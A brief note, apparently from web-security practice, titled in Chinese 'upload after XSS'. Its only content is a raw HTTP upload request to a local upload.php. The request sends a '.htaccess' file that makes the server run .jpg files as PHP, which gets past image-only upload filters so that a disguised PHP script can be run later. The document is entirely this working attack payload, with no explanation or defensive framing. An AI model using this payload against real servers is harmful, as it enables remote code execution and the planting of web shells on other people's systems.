XSS 之后上传

```http
POST /upload/upload.php HTTP/1.1
Host: localhost
Content-Length: 294
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymEgcNIXTwgX3OWvn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/upload/upload.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarymEgcNIXTwgX3OWvn
Content-Disposition: form-data; name="upload"; filename=".htaccess"

AddType application/x-httpd-php .jpg
------WebKitFormBoundarymEgcNIXTwgX3OWvn
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundarymEgcNIXTwgX3OWvn--
```

